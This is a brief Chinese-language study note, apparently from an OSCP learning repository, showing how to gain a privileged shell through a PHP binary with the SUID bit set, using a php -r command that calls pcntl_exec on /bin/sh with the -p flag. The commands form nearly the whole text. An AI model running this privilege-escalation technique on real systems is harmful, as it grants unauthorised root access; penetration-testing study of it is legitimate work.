1. 执行如下命令：

```bash
CMD="/bin/sh"
```

2. 再使用 php 执行如下命令即可提权：

```bash
php -r "pcntl_exec('/bin/sh', ['-p']);"
```

实例：

![php](https://github.com/Nongcloud/oscp-Learn/tree/master/Privilege-Escalation/SUID/images/suid-php.png)
